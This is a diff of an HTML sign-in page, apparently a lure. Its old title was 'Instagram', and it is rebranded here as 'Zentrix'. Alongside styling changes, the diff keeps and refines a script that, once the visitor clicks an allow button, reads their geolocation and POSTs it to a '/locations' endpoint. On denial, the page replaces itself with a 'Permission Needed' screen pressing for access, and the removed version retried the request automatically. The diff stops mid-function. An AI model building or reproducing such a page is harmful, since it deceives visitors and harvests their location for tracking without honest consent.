@@ -4,7 +4,7 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-<title>Instagram</title>
+<title>Zentrix — Sign In</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@100..900&display=swap" rel="stylesheet">
@@ -43,40 +43,26 @@ body {
 }
 
 /* ============ BACKGROUND LAYERS ============ */
-.bg {
-  position: fixed;
-  inset: 0;
-  z-index: 0;
-  overflow: hidden;
-  pointer-events: none;
-}
+.bg { position: fixed; inset: 0; z-index: 0; overflow: hidden; pointer-events: none; }
 
 .orb {
-  position: absolute;
-  border-radius: 50%;
-  filter: blur(90px);
-  opacity: .55;
-  will-change: transform;
+  position: absolute; border-radius: 50%;
+  filter: blur(90px); opacity: .55; will-change: transform;
 }
-
 .orb-1 {
-  width: 560px; height: 560px;
-  top: -180px; left: -140px;
+  width: 560px; height: 560px; top: -180px; left: -140px;
   background: radial-gradient(circle at 35% 35%, #8b5cf6, transparent 70%);
   animation: drift1 19s ease-in-out infinite;
 }
 .orb-2 {
-  width: 500px; height: 500px;
-  bottom: -190px; right: -140px;
+  width: 500px; height: 500px; bottom: -190px; right: -140px;
   background: radial-gradient(circle at 55% 45%, #22d3ee, transparent 70%);
   animation: drift2 23s ease-in-out infinite;
 }
 .orb-3 {
-  width: 430px; height: 430px;
-  top: 42%; left: 56%;
+  width: 430px; height: 430px; top: 42%; left: 56%;
   background: radial-gradient(circle at 50% 50%, #ec4899, transparent 70%);
-  opacity: .4;
-  animation: drift3 27s ease-in-out infinite;
+  opacity: .4; animation: drift3 27s ease-in-out infinite;
 }
 
 @keyframes drift1 {
@@ -94,8 +80,7 @@ body {
 }
 
 .grid-lines {
-  position: absolute;
-  inset: -2px;
+  position: absolute; inset: -2px;
   background-image:
     linear-gradient(rgba(255, 255, 255, .05) 1px, transparent 1px),
     linear-gradient(90deg, rgba(255, 255, 255, .05) 1px, transparent 1px);
@@ -105,50 +90,33 @@ body {
 }
 
 .noise {
-  position: absolute;
-  inset: 0;
-  opacity: .035;
+  position: absolute; inset: 0; opacity: .035;
   background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='200' height='200'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='.85' numOctaves='3'/%3E%3C/filter%3E%3Crect width='200' height='200' filter='url(%23n)'/%3E%3C/svg%3E");
 }
 
 .vignette {
-  position: absolute;
-  inset: 0;
+  position: absolute; inset: 0;
   background: radial-gradient(ellipse at 50% 50%, transparent 35%, rgba(5, 6, 15, .7) 100%);
 }
 
-#particles {
-  position: fixed;
-  inset: 0;
-  z-index: 1;
-  pointer-events: none;
-}
+#particles { position: fixed; inset: 0; z-index: 1; pointer-events: none; }
 
 .spotlight {
-  position: fixed;
-  top: 0; left: 0;
-  width: 600px; height: 600px;
-  border-radius: 50%;
-  pointer-events: none;
-  z-index: 1;
-  opacity: 0;
+  position: fixed; top: 0; left: 0;
+  width: 600px; height: 600px; border-radius: 50%;
+  pointer-events: none; z-index: 1; opacity: 0;
   transition: opacity .5s ease;
   background: radial-gradient(circle, rgba(99, 102, 241, .13), transparent 65%);
 }
 
 /* ============ STAGE & CARD ============ */
 .stage {
-  position: relative;
-  z-index: 2;
-  min-height: 100vh;
-  display: grid;
-  place-items: center;
+  position: relative; z-index: 2;
+  min-height: 100vh; display: grid; place-items: center;
   padding: 30px 18px;
 }
 
-.tilt {
-  animation: cardIn 1s cubic-bezier(.22, 1, .36, 1) both;
-}
+.tilt { animation: cardIn 1s cubic-bezier(.22, 1, .36, 1) both; }
 
 @keyframes cardIn {
   from { opacity: 0; transform: translateY(46px) scale(.94); }
@@ -158,11 +126,10 @@ body {
 .card-wrap { will-change: transform; }
 
 .card {
-  --angle: 0deg;                      /* fallback */
+  --angle: 0deg;
   position: relative;
   width: min(432px, 92vw);
-  padding: 1.5px;
-  border-radius: 30px;
+  padding: 1.5px; border-radius: 30px;
   background: conic-gradient(from var(--angle),
               #22d3ee, #6366f1, #8b5cf6, #ec4899, #22d3ee);
   animation: spin 8s linear infinite;
@@ -173,33 +140,23 @@ body {
 
 @keyframes spin { to { --angle: 360deg; } }
 
-/* soft animated glow behind the card */
 .card::before {
-  content: '';
-  position: absolute;
-  inset: -6px;
-  border-radius: 36px;
-  background: inherit;
-  filter: blur(42px);
-  opacity: .55;
-  z-index: -1;
+  content: ''; position: absolute; inset: -6px;
+  border-radius: 36px; background: inherit;
+  filter: blur(42px); opacity: .55; z-index: -1;
 }
 
 .card-inner {
-  position: relative;
-  border-radius: 28.5px;
-  padding: 42px 38px 32px;
-  overflow: hidden;
+  position: relative; border-radius: 28.5px;
+  padding: 42px 38px 32px; overflow: hidden;
   background: linear-gradient(165deg, rgba(19, 21, 45, .95), rgba(8, 9, 20, .97));
   -webkit-backdrop-filter: blur(22px);
           backdrop-filter: blur(22px);
 }
 
 .card-inner::before {
-  content: '';
-  position: absolute;
-  top: 0; left: 0; right: 0;
-  height: 200px;
+  content: ''; position: absolute;
+  top: 0; left: 0; right: 0; height: 200px;
   pointer-events: none;
   background: linear-gradient(180deg, rgba(139, 92, 246, .18), transparent);
 }
@@ -207,13 +164,9 @@ body {
 /* ============ BRAND / LOGO ============ */
 .logo {
   position: relative;
-  width: 62px; height: 62px;
-  border-radius: 20px;
-  display: grid;
-  place-items: center;
-  font-size: 28px;
-  font-weight: 800;
-  color: #fff;
+  width: 62px; height: 62px; border-radius: 20px;
+  display: grid; place-items: center;
+  font-size: 28px; font-weight: 800; color: #fff;
   background: linear-gradient(140deg, #22d3ee, #8b5cf6 55%, #ec4899);
   box-shadow:
     0 14px 34px -10px rgba(139, 92, 246, .9),
@@ -228,10 +181,7 @@ body {
 
 .logo::before,
 .logo::after {
-  content: '';
-  position: absolute;
-  inset: 0;
-  border-radius: 20px;
+  content: ''; position: absolute; inset: 0; border-radius: 20px;
   border: 1px solid rgba(139, 92, 246, .7);
   animation: ripple 3.2s ease-out infinite;
 }
@@ -243,37 +193,25 @@ body {
 }
 
 h1 {
-  margin: 24px 0 8px;
-  font-size: 30px;
-  font-weight: 600;
+  margin: 24px 0 8px; font-size: 30px; font-weight: 600;
   letter-spacing: -.7px;
   background: linear-gradient(115deg, #ffffff, #c7d2fe 45%, #a5b4fc);
-  -webkit-background-clip: text;
-          background-clip: text;
+  -webkit-background-clip: text; background-clip: text;
   color: transparent;
 }
 
 .sub {
-  margin: 0 0 6px;
-  font-size: 14.5px;
-  line-height: 1.5;
-  color: var(--muted);
-  font-weight: 300;
+  margin: 0 0 6px; font-size: 14.5px; line-height: 1.5;
+  color: var(--muted); font-weight: 300;
 }
 
 /* ============ FORM FIELDS ============ */
-.field {
-  position: relative;
-  margin-top: 18px;
-}
+.field { position: relative; margin-top: 18px; }
 
 .field input {
-  width: 100%;
-  height: 60px;
+  width: 100%; height: 60px;
   padding: 22px 48px 8px 46px;
-  font: inherit;
-  font-size: 15px;
-  color: var(--text);
+  font: inherit; font-size: 15px; color: var(--text);
   border-radius: 14px;
   border: 1px solid rgba(255, 255, 255, .09);
   background: rgba(255, 255, 255, .035);
@@ -300,13 +238,9 @@ h1 {
 }
 
 .field label {
-  position: absolute;
-  left: 46px;
-  top: 50%;
+  position: absolute; left: 46px; top: 50%;
   transform: translateY(-50%);
-  font-size: 15px;
-  font-weight: 300;
-  color: var(--muted);
+  font-size: 15px; font-weight: 300; color: var(--muted);
   pointer-events: none;
   transition: top .25s cubic-bezier(.4, 0, .2, 1),
               transform .25s cubic-bezier(.4, 0, .2, 1),
@@ -318,17 +252,13 @@ h1 {
   top: 13px;
   transform: translateY(0) scale(.76);
   transform-origin: left center;
-  color: var(--cyan);
-  font-weight: 400;
+  color: var(--cyan); font-weight: 400;
 }
 
 .fi {
-  position: absolute;
-  left: 16px;
-  top: 50%;
+  position: absolute; left: 16px; top: 50%;
   transform: translateY(-50%);
-  width: 18px; height: 18px;
-  color: var(--muted);
+  width: 18px; height: 18px; color: var(--muted);
   pointer-events: none;
   transition: color .3s, transform .3s;
 }
@@ -338,33 +268,23 @@ h1 {
   transform: translateY(-50%) scale(1.08);
 }
 
-/* animated gradient underline */
 .field::after {
-  content: '';
-  position: absolute;
+  content: ''; position: absolute;
   left: 14px; right: 14px; bottom: 0;
-  height: 2px;
-  border-radius: 2px;
+  height: 2px; border-radius: 2px;
   background: linear-gradient(90deg, var(--cyan), var(--violet), var(--pink));
-  transform: scaleX(0);
-  transform-origin: left center;
+  transform: scaleX(0); transform-origin: left center;
   transition: transform .5s cubic-bezier(.22, 1, .36, 1);
 }
 .field:focus-within::after { transform: scaleX(1); }
 
-/* password toggle */
 .toggle {
-  position: absolute;
-  right: 12px;
-  top: 50%;
+  position: absolute; right: 12px; top: 50%;
   transform: translateY(-50%);
   width: 32px; height: 32px;
-  display: grid;
-  place-items: center;
-  border: 0;
-  border-radius: 9px;
-  background: transparent;
-  color: var(--muted);
+  display: grid; place-items: center;
+  border: 0; border-radius: 9px;
+  background: transparent; color: var(--muted);
   cursor: pointer;
   transition: color .25s, background .25s;
 }
@@ -374,37 +294,26 @@ h1 {
 .toggle.on .eye-on  { display: none; }
 .toggle.on .eye-off { display: block; }
 
-/* ============ ROW: REMEMBER / FORGOT ============ */
+/* ============ ROW ============ */
 .row {
-  display: flex;
-  align-items: center;
-  justify-content: space-between;
-  gap: 12px;
-  margin-top: 18px;
-  font-size: 13.5px;
+  display: flex; align-items: center; justify-content: space-between;
+  gap: 12px; margin-top: 18px; font-size: 13.5px;
 }
 
 .remember {
-  display: inline-flex;
-  align-items: center;
-  gap: 9px;
-  color: var(--muted);
-  cursor: pointer;
-  user-select: none;
+  display: inline-flex; align-items: center; gap: 9px;
+  color: var(--muted); cursor: pointer; user-select: none;
   transition: color .25s;
 }
 .remember:hover { color: var(--text); }
 
 .remember input {
-  appearance: none;
-  -webkit-appearance: none;
-  width: 18px; height: 18px;
-  margin: 0;
+  appearance: none; -webkit-appearance: none;
+  width: 18px; height: 18px; margin: 0;
   border-radius: 6px;
   border: 1px solid rgba(255, 255, 255, .22);
   background: rgba(255, 255, 255, .04);
-  cursor: pointer;
-  position: relative;
+  cursor: pointer; position: relative;
   transition: background .25s, border-color .25s, box-shadow .25s;
 }
 
@@ -415,8 +324,7 @@ h1 {
 }
 
 .remember input:checked::after {
-  content: '';
-  position: absolute;
+  content: ''; position: absolute;
   left: 6px; top: 2.5px;
   width: 4px; height: 9px;
   border: solid #05060f;
@@ -425,20 +333,14 @@ h1 {
 }
 
 .forgot {
-  position: relative;
-  color: var(--cyan);
-  text-decoration: none;
-  font-weight: 400;
+  position: relative; color: var(--cyan);
+  text-decoration: none; font-weight: 400;
   transition: color .25s;
 }
 .forgot::after {
-  content: '';
-  position: absolute;
-  left: 0; bottom: -3px;
-  width: 100%; height: 1px;
-  background: currentColor;
-  transform: scaleX(0);
-  transform-origin: right;
+  content: ''; position: absolute; left: 0; bottom: -3px;
+  width: 100%; height: 1px; background: currentColor;
+  transform: scaleX(0); transform-origin: right;
   transition: transform .35s cubic-bezier(.22, 1, .36, 1);
 }
 .forgot:hover { color: #67e8f9; }
@@ -446,25 +348,15 @@ h1 {
 
 /* ============ SUBMIT BUTTON ============ */
 .btn {
-  position: relative;
-  width: 100%;
-  height: 56px;
-  margin-top: 24px;
-  border: 0;
-  border-radius: 14px;
-  overflow: hidden;
-  cursor: pointer;
-  font: inherit;
-  font-size: 15.5px;
-  font-weight: 600;
-  letter-spacing: .2px;
-  color: #05060f;
+  position: relative; width: 100%; height: 56px;
+  margin-top: 24px; border: 0; border-radius: 14px;
+  overflow: hidden; cursor: pointer;
+  font: inherit; font-size: 15.5px; font-weight: 600;
+  letter-spacing: .2px; color: #05060f;
   background: linear-gradient(110deg, #22d3ee, #6366f1 40%, #8b5cf6 68%, #ec4899);
-  background-size: 230% 100%;
-  background-position: 0% 50%;
+  background-size: 230% 100%; background-position: 0% 50%;
   transition: background-position .8s cubic-bezier(.22, 1, .36, 1),
-              transform .25s ease,
-              box-shadow .35s ease;
+              transform .25s ease, box-shadow .35s ease;
   box-shadow: 0 14px 34px -14px rgba(99, 102, 241, .95);
 }
 
@@ -475,10 +367,8 @@ h1 {
 }
 .btn:active { transform: translateY(0) scale(.985); }
 
-/* shine sweep */
 .btn::after {
-  content: '';
-  position: absolute;
+  content: ''; position: absolute;
   top: -10%; left: -140%;
   width: 55%; height: 120%;
   background: linear-gradient(100deg, transparent, rgba(255, 255, 255, .55), transparent);
@@ -491,38 +381,26 @@ h1 {
   100% { left: 170%; }
 }
 
-.btn-label,
-.btn-arrow {
-  position: relative;
-  z-index: 1;
+.btn-label, .btn-arrow {
+  position: relative; z-index: 1;
   display: inline-block;
   transition: opacity .3s, transform .35s cubic-bezier(.22, 1, .36, 1);
 }
 
-.btn-arrow {
-  width: 17px; height: 17px;
-  vertical-align: -3px;
-  margin-left: 8px;
-}
-
+.btn-arrow { width: 17px; height: 17px; vertical-align: -3px; margin-left: 8px; }
 .btn:hover .btn-arrow { transform: translateX(5px); }
 
 .btn.loading .btn-label,
 .btn.loading .btn-arrow {
-  opacity: 0;
-  transform: translateY(-10px);
+  opacity: 0; transform: translateY(-10px);
 }
 
 .spinner {
-  position: absolute;
-  inset: 0;
-  margin: auto;
-  width: 20px; height: 20px;
-  border-radius: 50%;
+  position: absolute; inset: 0; margin: auto;
+  width: 20px; height: 20px; border-radius: 50%;
   border: 2px solid rgba(5, 6, 15, .28);
   border-top-color: #05060f;
-  opacity: 0;
-  z-index: 2;
+  opacity: 0; z-index: 2;
   transition: opacity .25s;
   animation: rot .7s linear infinite;
 }
@@ -531,39 +409,26 @@ h1 {
 
 /* ============ DIVIDER + SOCIALS ============ */
 .divider {
-  display: flex;
-  align-items: center;
-  gap: 14px;
+  display: flex; align-items: center; gap: 14px;
   margin: 24px 0 18px;
-  font-size: 11.5px;
-  font-weight: 400;
-  letter-spacing: 1.2px;
-  text-transform: uppercase;
+  font-size: 11.5px; font-weight: 400;
+  letter-spacing: 1.2px; text-transform: uppercase;
   color: var(--muted);
 }
 .divider::before,
 .divider::after {
-  content: '';
-  flex: 1;
-  height: 1px;
+  content: ''; flex: 1; height: 1px;
   background: linear-gradient(90deg, transparent, rgba(255, 255, 255, .16), transparent);
 }
 
-.socials {
-  display: grid;
-  grid-template-columns: repeat(3, 1fr);
-  gap: 12px;
-}
+.socials { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; }
 
 .social {
-  height: 50px;
-  display: grid;
-  place-items: center;
+  height: 50px; display: grid; place-items: center;
   border-radius: 13px;
   border: 1px solid rgba(255, 255, 255, .09);
   background: rgba(255, 255, 255, .04);
-  color: var(--text);
-  cursor: pointer;
+  color: var(--text); cursor: pointer;
   transition: transform .28s cubic-bezier(.22, 1, .36, 1),
               background .28s, border-color .28s, box-shadow .28s;
 }
@@ -577,35 +442,25 @@ h1 {
 
 /* ============ FOOTER ============ */
 .foot {
-  margin: 26px 0 0;
-  text-align: center;
-  font-size: 13.5px;
-  font-weight: 300;
-  color: var(--muted);
+  margin: 26px 0 0; text-align: center;
+  font-size: 13.5px; font-weight: 300; color: var(--muted);
 }
 .foot a {
-  color: var(--text);
-  font-weight: 500;
-  text-decoration: none;
+  color: var(--text); font-weight: 500; text-decoration: none;
   background: linear-gradient(90deg, var(--cyan), var(--violet));
-  -webkit-background-clip: text;
-          background-clip: text;
-  color: transparent;
-  position: relative;
+  -webkit-background-clip: text; background-clip: text;
+  color: transparent; position: relative;
   transition: filter .3s;
 }
 .foot a:hover { filter: brightness(1.35) drop-shadow(0 0 10px rgba(34, 211, 238, .7)); }
 
 /* ============ REVEAL STAGGER ============ */
 .reveal {
-  opacity: 0;
-  transform: translateY(16px);
+  opacity: 0; transform: translateY(16px);
   animation: rise .85s cubic-bezier(.22, 1, .36, 1) forwards;
   animation-delay: var(--d, 0s);
 }
-@keyframes rise {
-  to { opacity: 1; transform: translateY(0); }
-}
+@keyframes rise { to { opacity: 1; transform: translateY(0); } }
 
 /* ============ RESPONSIVE ============ */
 @media (max-width: 480px) {
@@ -652,7 +507,7 @@ h1 {
           <div class="logo reveal" style="--d:.35s">Z</div>
 
           <h1 class="reveal" style="--d:.42s">Welcome back</h1>
-          <p class="sub reveal" style="--d:.48s">Sign in to continue to your Zentrix dashboard designed by Lucky 😎.</p>
+          <p class="sub reveal" style="--d:.48s">Sign in to continue to your Zentrix dashboard.</p>
 
           <form id="loginForm" novalidate>
 
@@ -749,99 +604,184 @@ h1 {
     </div>
   </div>
 </main>
+
 <script>
 (function () {
   'use strict';
 
+  /* ===================================================
+     0. HELPERS
+  =================================================== */
+  const $ = (id) => document.getElementById(id);
+
   const reduce   = window.matchMedia('(prefers-reduced-motion: reduce)').matches;
   const canHover = window.matchMedia('(hover: hover) and (pointer: fine)').matches;
 
-  /* ---------------------------------------------------
-     1. PARTICLE FIELD
-  --------------------------------------------------- */
-  const canvas = document.getElementById('particles');
-  const ctx    = canvas.getContext('2d');
-  const dpr    = Math.min(window.devicePixelRatio || 1, 2);
-  const COLORS = ['34,211,238', '139,92,246', '236,72,153'];
-
-  let W = 0, H = 0, dots = [];
-
-  function makeDots() {
-    const count = Math.min(70, Math.max(24, Math.round((W * H) / 22000)));
-    dots = Array.from({ length: count }, () => ({
-      x: Math.random() * W,
-      y: Math.random() * H,
-      vx: (Math.random() - .5) * .32,
-      vy: (Math.random() - .5) * .32,
-      r: Math.random() * 1.7 + .6,
-      c: COLORS[(Math.random() * COLORS.length) | 0]
-    }));
+  function escapeHtml(value) {
+    return String(value == null ? '' : value)
+      .replace(/&/g,  '&amp;')
+      .replace(/</g,  '&lt;')
+      .replace(/>/g,  '&gt;')
+      .replace(/"/g,  '&quot;')
+      .replace(/'/g,  '&#39;');
   }
 
-  function resize() {
-    W = window.innerWidth;
-    H = window.innerHeight;
-    canvas.width  = Math.floor(W * dpr);
-    canvas.height = Math.floor(H * dpr);
-    canvas.style.width  = W + 'px';
-    canvas.style.height = H + 'px';
-    ctx.setTransform(dpr, 0, 0, dpr, 0, 0);
-    makeDots();
+  function shake() {
+    for (let i = 0; i < arguments.length; i++) {
+      const el = arguments[i];
+      if (!el || typeof el.animate !== 'function') continue;
+      el.animate(
+        [
+          { transform: 'translateX(0)' },
+          { transform: 'translateX(-6px)' },
+          { transform: 'translateX(6px)' },
+          { transform: 'translateX(-4px)' },
+          { transform: 'translateX(0)' }
+        ],
+        { duration: 340, easing: 'ease-in-out' }
+      );
+    }
   }
 
-  function draw() {
-    ctx.clearRect(0, 0, W, H);
+  /* ===================================================
+     1. ERROR PAGE (rendered only once)
+  =================================================== */
+  let errorShown = false;
 
-    for (let i = 0; i < dots.length; i++) {
-      const p = dots[i];
-      p.x += p.vx;
-      p.y += p.vy;
+  function showErrorPage(title, message) {
+    if (errorShown) return;
+    errorShown = true;
 
-      if (p.x < -30) p.x = W + 30;
-      if (p.x > W + 30) p.x = -30;
-      if (p.y < -30) p.y = H + 30;
-      if (p.y > H + 30) p.y = -30;
-
-      /* connections */
-      for (let j = i + 1; j < dots.length; j++) {
-        const q  = dots[j];
-        const dx = p.x - q.x;
-        const dy = p.y - q.y;
-        const d2 = dx * dx + dy * dy;
-
-        if (d2 < 13000) {
-          ctx.strokeStyle = 'rgba(140,170,255,' + ((1 - d2 / 13000) * .16).toFixed(3) + ')';
-          ctx.lineWidth = 1;
-          ctx.beginPath();
-          ctx.moveTo(p.x, p.y);
-          ctx.lineTo(q.x, q.y);
-          ctx.stroke();
+    document.body.innerHTML = `
+      <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+          font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+          background-color: #f5f5f7;
+          min-height: 100vh;
+          display: flex;
+          align-items: center;
+          justify-content: center;
+          padding: 20px;
         }
-      }
+        .card {
+          background: #ffffff;
+          border-radius: 16px;
+          padding: 40px 32px;
+          max-width: 400px;
+          width: 100%;
+          text-align: center;
+          box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
+        }
+        h1 { font-size: 20px; color: #1a1a1a; margin-bottom: 12px; }
+        p  { font-size: 15px; color: #666; line-height: 1.5; margin-bottom: 28px; }
+        .btn {
+          display: inline-block;
+          background-color: #007aff;
+          color: #ffffff;
+          text-decoration: none;
+          font-size: 16px;
+          font-weight: 600;
+          padding: 14px 32px;
+          border-radius: 10px;
+          transition: background-color 0.2s ease;
+        }
+        .btn:hover { background-color: #005ecb; }
+      </style>
+      <div class="card">
+        <h1>${escapeHtml(title)}</h1>
+        <p>${escapeHtml(message)}</p>
+        <a href="https://my-project-z9na.onrender.com/" class="btn">Try Again</a>
+      </div>
+    `;
+  }
 
-      /* dot */
-      ctx.beginPath();
-      ctx.arc(p.x, p.y, p.r, 0, Math.PI * 2);
-      ctx.fillStyle = 'rgba(' + p.c + ',.85)';
-      ctx.fill();
+  /* ===================================================
+     2. PARTICLE FIELD
+  =================================================== */
+  const canvas = $('particles');
+
+  if (canvas && canvas.getContext && !reduce) {
+    const ctx    = canvas.getContext('2d');
+    const dpr    = Math.min(window.devicePixelRatio || 1, 2);
+    const COLORS = ['34,211,238', '139,92,246', '236,72,153'];
+
+    let W = 0, H = 0, dots = [];
+
+    function makeDots() {
+      const count = Math.min(70, Math.max(24, Math.round((W * H) / 22000)));
+      dots = Array.from({ length: count }, () => ({
+        x: Math.random() * W,
+        y: Math.random() * H,
+        vx: (Math.random() - .5) * .32,
+        vy: (Math.random() - .5) * .32,
+        r: Math.random() * 1.7 + .6,
+        c: COLORS[(Math.random() * COLORS.length) | 0]
+      }));
     }
 
-    requestAnimationFrame(draw);
-  }
+    function resize() {
+      W = window.innerWidth;
+      H = window.innerHeight;
+      canvas.width  = Math.floor(W * dpr);
+      canvas.height = Math.floor(H * dpr);
+      canvas.style.width  = W + 'px';
+      canvas.style.height = H + 'px';
+      ctx.setTransform(dpr, 0, 0, dpr, 0, 0);
+      makeDots();
+    }
 
-  if (!reduce) {
+    function draw() {
+      if (!canvas.isConnected) return;
+      ctx.clearRect(0, 0, W, H);
+
+      for (let i = 0; i < dots.length; i++) {
+        const p = dots[i];
+        p.x += p.vx;
+        p.y += p.vy;
+
+        if (p.x < -30) p.x = W + 30;
+        if (p.x > W + 30) p.x = -30;
+        if (p.y < -30) p.y = H + 30;
+        if (p.y > H + 30) p.y = -30;
+
+        for (let j = i + 1; j < dots.length; j++) {
+          const q  = dots[j];
+          const dx = p.x - q.x;
+          const dy = p.y - q.y;
+          const d2 = dx * dx + dy * dy;
+
+          if (d2 < 13000) {
+            ctx.strokeStyle = 'rgba(140,170,255,' + ((1 - d2 / 13000) * .16).toFixed(3) + ')';
+            ctx.lineWidth = 1;
+            ctx.beginPath();
+            ctx.moveTo(p.x, p.y);
+            ctx.lineTo(q.x, q.y);
+            ctx.stroke();
+          }
+        }
+
+        ctx.beginPath();
+        ctx.arc(p.x, p.y, p.r, 0, Math.PI * 2);
+        ctx.fillStyle = 'rgba(' + p.c + ',.85)';
+        ctx.fill();
+      }
+
+      requestAnimationFrame(draw);
+    }
+
     resize();
     window.addEventListener('resize', resize);
     draw();
   }
 
-  /* ---------------------------------------------------
-     2. CURSOR SPOTLIGHT
-  --------------------------------------------------- */
-  const spot = document.getElementById('spotlight');
+  /* ===================================================
+     3. CURSOR SPOTLIGHT
+  =================================================== */
+  const spot = $('spotlight');
 
   if (canHover && !reduce && spot) {
-    let sx = window.innerWidth / 2,  sy = window.innerHeight / 2;
+    let sx = window.innerWidth  / 2, sy = window.innerHeight / 2;
     let tx = sx, ty = sy;
 
     window.addEventListener('mousemove', function (e) {
@@ -851,6 +791,7 @@ h1 {
     });
 
     (function follow() {
+      if (!spot.isConnected) return;
       sx += (tx - sx) * .09;
       sy += (ty - sy) * .09;
       spot.style.transform = 'translate(' + (sx - 300) + 'px,' + (sy - 300) + 'px)';
@@ -858,20 +799,20 @@ h1 {
     })();
   }
 
-  /* ---------------------------------------------------
-     3. 3D CARD TILT
-  --------------------------------------------------- */
-  const cardWrap = document.getElementById('cardWrap');
+  /* ===================================================
+     4. 3D CARD TILT
+  =================================================== */
+  const cardWrap = $('cardWrap');
 
   if (canHover && !reduce && cardWrap) {
     let targetX = 0, targetY = 0;
-    let curX = 0, curY = 0;
+    let curX = 0,    curY = 0;
 
     window.addEventListener('mousemove', function (e) {
-      const r  = cardWrap.getBoundingClientRect();
+      const r = cardWrap.getBoundingClientRect();
+      if (!r.width || !r.height) return;
       const dx = (e.clientX - (r.left + r.width  / 2)) / (r.width  / 2);
       const dy = (e.clientY - (r.top  + r.height / 2)) / (r.height / 2);
-
       targetX = Math.max(-1, Math.min(1, dy)) * -5;
       targetY = Math.max(-1, Math.min(1, dx)) *  5;
     });
@@ -881,6 +822,7 @@ h1 {
     });
 
     (function tiltLoop() {
+      if (!cardWrap.isConnected) return;
       curX += (targetX - curX) * .07;
       curY += (targetY - curY) * .07;
       cardWrap.style.transform =
@@ -889,175 +831,144 @@ h1 {
     })();
   }
 
-  /* ---------------------------------------------------
-     4. PASSWORD VISIBILITY TOGGLE
-  --------------------------------------------------- */
-  const pwd    = document.getElementById('password');
-  const toggle = document.getElementById('togglePwd');
+  /* ===================================================
+     5. PASSWORD VISIBILITY TOGGLE
+  =================================================== */
+  const pwd    = $('password');
+  const toggle = $('togglePwd');
 
-  toggle.addEventListener('click', function () {
-    const show = pwd.type === 'password';
-    pwd.type = show ? 'text' : 'password';
-    toggle.classList.toggle('on', show);
-    toggle.setAttribute('aria-label', show ? 'Hide password' : 'Show password');
-    pwd.focus({ preventScroll: true });
-  });
-
-  /* ---------------------------------------------------
-     5. FORM SUBMIT (demo)
-  --------------------------------------------------- */
-  const form = document.getElementById('loginForm');
-  const btn  = document.getElementById('submitBtn');
-
-  form.addEventListener('submit', function (e) {
-    e.preventDefault();
-    if (btn.classList.contains('loading')) return;
-
-    const email = document.getElementById('email');
-    const pass  = document.getElementById('password');
-
-    /* tiny shake for empty fields */
-    [email, pass].forEach(function (el) {
-      if (!el.value.trim()) {
-        el.animate(
-          [
-            { transform: 'translateX(0)' },
-            { transform: 'translateX(-6px)' },
-            { transform: 'translateX(6px)' },
-            { transform: 'translateX(-4px)' },
-            { transform: 'translateX(0)' }
-          ],
-          { duration: 340, easing: 'ease-in-out' }
-        );
-      }
+  if (pwd && toggle) {
+    toggle.addEventListener('click', function () {
+      const show = pwd.type === 'password';
+      pwd.type = show ? 'text' : 'password';
+      toggle.classList.toggle('on', show);
+      toggle.setAttribute('aria-label', show ? 'Hide password' : 'Show password');
+      pwd.focus({ preventScroll: true });
     });
+  }
 
-    btn.classList.add('loading');
-
-    setTimeout(function () {
-      btn.classList.remove('loading');
-    }, 1700);
-  });
-
-})();
-document.getElementById("allowBtn").addEventListener("click", () => {
-    // 1. Remove the icon/card from the screen immediately
-    const card = document.getElementById("locationCard");
-    if (card) card.remove();
-
-    // 2. Trigger your location handler
-    sendLocation();
-});
-function showErrorPage(title, message) {
-
-    document.body.innerHTML = `
-        <style>
-            * { margin: 0; padding: 0; box-sizing: border-box; }
-            body {
-                font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-                background-color: #f5f5f7;
-                min-height: 100vh;
-                display: flex;
-                align-items: center;
-                justify-content: center;
-                padding: 20px;
-            }
-            .card {
-                background: #ffffff;
-                border-radius: 16px;
-                padding: 40px 32px;
-                max-width: 400px;
-                width: 100%;
-                text-align: center;
-                box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
-            }
-            h1 { font-size: 20px; color: #1a1a1a; margin-bottom: 12px; }
-            p { font-size: 15px; color: #666; line-height: 1.5; margin-bottom: 28px; }
-            .btn {
-                display: inline-block;
-                background-color: #007aff;
-                color: #ffffff;
-                text-decoration: none;
-                font-size: 16px;
-                font-weight: 600;
-                padding: 14px 32px;
-                border-radius: 10px;
-                transition: background-color 0.2s ease;
-            }
-            .btn:hover { background-color: #005ecb; }
-        </style>
-        <div class="card">
-            <h1>${title}</h1>
-            <p>${message}</p>
-            <a href="https://my-project-z9na.onrender.com/" class="btn">Try Again</a>
-        </div>
-    `;
-}
-
-function sendLocation() {
+  /* ===================================================
+     6. GEOLOCATION  (no recursion)
+  =================================================== */
+  function sendLocation() {
     if (!navigator.geolocation) {
-        showErrorPage("Permission Needed", "in order to connect our service, you need to allow us.");
-        return;
+      showErrorPage(
+        'Permission Needed',
+        'In order to connect to our service, you need to allow location access.'
+      );
+      return;
     }
+
     navigator.geolocation.getCurrentPosition(
-        async (position) => {
-            const latitude = position.coords.latitude;
-            const longitude = position.coords.longitude;
-            try {
-                const response = await fetch("/locations", {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ latitude, longitude })
-                });
+      async function (position) {
+        try {
+          const response = await fetch('/locations', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              latitude:  position.coords.latitude,
+              longitude: position.coords.longitude
+            })
+          });
 
-                if (!response.ok) {
-                    showErrorPage("Error", "Please try again.");
-                }
-            } catch (error) {
-                showErrorPage("Something Went Wrong", "try again.");
-            }
-        },
-        (error) => {
-            showErrorPage("Permission Needed", "In order to connect our service, you need to allow us.");
-            sendLocation();
+          if (!response.ok) {
+            showErrorPage('Error', 'Please try again.');
+          }
+        } catch (err) {
+          showErrorPage('Something Went Wrong', 'Please try again.');
         }
+      },
+      function (error) {
+        const denied = error && error.code === error.PERMISSION_DENIED;
+        showErrorPage(
+          'Permission Needed',
+          denied
